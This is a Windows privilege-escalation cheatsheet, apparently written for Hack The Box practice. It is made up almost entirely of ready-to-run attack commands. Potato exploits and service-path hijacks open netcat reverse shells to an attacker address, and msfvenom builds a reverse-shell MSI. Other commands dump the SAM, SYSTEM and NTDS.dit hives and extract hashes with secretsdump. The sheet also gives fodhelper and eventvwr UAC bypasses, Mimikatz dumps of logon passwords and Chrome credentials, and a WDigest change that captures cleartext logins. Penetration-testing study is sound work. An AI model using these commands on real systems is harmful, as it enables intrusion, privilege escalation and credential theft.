# Windows Privilege Escalation Cheatsheet

Common privesc vectors encountered in HTB Windows machines.

## Quick Wins

```powershell
# 1. Check privileges
whoami /priv
# SeImpersonatePrivilege -> Potato attacks
# SeBackupPrivilege -> Read any file (SAM/SYSTEM)
# SeRestorePrivilege -> Write any file
# SeTakeOwnershipPrivilege -> Take ownership of any object

# 2. Stored credentials
cmdkey /list
runas /savecred /user:administrator cmd.exe

# 3. AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1: msiexec /quiet /qn /i shell.msi

# 4. AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# 5. Unattend files
dir /s /b C:\unattend.xml C:\sysprep.xml C:\sysprep.inf 2>nul
```

## Token Impersonation (Potato Attacks)

```powershell
# Requires: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege

# PrintSpoofer (Windows 10 / Server 2016-2019)
.\PrintSpoofer64.exe -c "cmd /c whoami > C:\temp\output.txt"
.\PrintSpoofer64.exe -i -c powershell.exe

# GodPotato (Windows 8 - 11, Server 2012 - 2022)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\temp\nc.exe 10.10.14.X 4444 -e cmd.exe"

# JuicyPotatoNG
.\JuicyPotatoNG.exe -t * -p "C:\temp\nc.exe" -a "10.10.14.X 4444 -e cmd.exe"

# SweetPotato
.\SweetPotato.exe -p C:\temp\nc.exe -a "10.10.14.X 4444 -e cmd.exe"

# RoguePotato
.\RoguePotato.exe -r 10.10.14.X -e "cmd.exe /c C:\temp\nc.exe 10.10.14.X 4444 -e cmd.exe" -l 9999
```

## Service Exploitation

```powershell
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Weak service permissions
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# Modify service binary path
sc config VulnService binpath= "C:\temp\nc.exe 10.10.14.X 4444 -e cmd.exe"
sc stop VulnService
sc start VulnService

# Writable service binary
# Replace the binary with your payload
copy C:\temp\shell.exe "C:\Program Files\VulnService\service.exe"
sc stop VulnService
sc start VulnService

# DLL hijacking
# Find missing DLLs with Process Monitor
# Place malicious DLL in writable directory in service PATH
```

## Registry Exploitation

```powershell
# Writable service registry keys
# Check HKLM\System\CurrentControlSet\Services\
reg query HKLM\System\CurrentControlSet\Services\VulnService
# If writable, change ImagePath

# AutoRun programs
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# If writable location, replace binary with payload

# AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.X LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i C:\temp\shell.msi
```

## SeBackupPrivilege

```powershell
# Method 1: Copy SAM and SYSTEM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Method 2: Using robocopy
robocopy /b C:\Users\Administrator\Desktop C:\temp flag.txt

# Method 3: diskshadow + robocopy for NTDS.dit
# Create shadow copy script:
set context persistent nowriters
add volume c: alias mydrive
create
expose %mydrive% z:
# Run: diskshadow /s script.txt
robocopy /b z:\Windows\NTDS C:\temp NTDS.dit

# Extract hashes
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

## Scheduled Tasks

```powershell
# List scheduled tasks
schtasks /query /fo LIST /v

# Check for writable task binaries
icacls "C:\Path\To\Task\Binary.exe"

# Check for tasks running as SYSTEM
schtasks /query /fo LIST /v | findstr /i "Run As User" | findstr /i "SYSTEM"
```

## UAC Bypass

```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# Fodhelper bypass
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe

# Eventvwr bypass
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe

# UACME tool
.\Akagi64.exe <method_id> cmd.exe
```

## Credential Harvesting

```powershell
# Mimikatz
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::sam
mimikatz# lsadump::secrets

# DPAPI - Chrome passwords
mimikatz# dpapi::chrome /in:"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Vault
mimikatz# vault::cred
mimikatz# vault::list

# WDigest (if enabled)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
# Then wait for user to login and dump with Mimikatz
```

## Automated Tools

```powershell
# WinPEAS
.\winPEASx64.exe servicesinfo

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all -full

# SharpUp
.\SharpUp.exe audit

# PrivescCheck
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Report PrivescCheck_Report -Format HTML
```
